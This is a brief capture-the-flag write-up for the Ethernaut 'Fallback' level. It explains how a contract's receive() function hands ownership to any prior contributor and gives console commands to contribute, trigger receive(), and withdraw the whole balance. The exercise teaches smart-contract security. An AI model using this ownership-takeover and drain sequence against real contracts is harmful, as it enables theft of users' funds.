### Goals

- claim ownership of contract
- reduce it's balance to 0

### Exploit

We can see that to set owner of the contract we need to call `receive()` function. But before we need to fullfil require check, so we need to call `contribute()` first so our balance at contributors mapping is gt 0.

1. Contribute
2. Trigger receive, which will set you as owner
3. Withdraw

### Code

Execute following code in your developer console at Ethernaut page.

```code
await contract.contribute({value: 100000000000000})
```

```code
await sendTransaction({from: player, to: contract.address, data: "0x", value: 1})
```

```code
await contract.withdraw()
```

```code
await getBalance(contract.address)
'0'
```

Done!
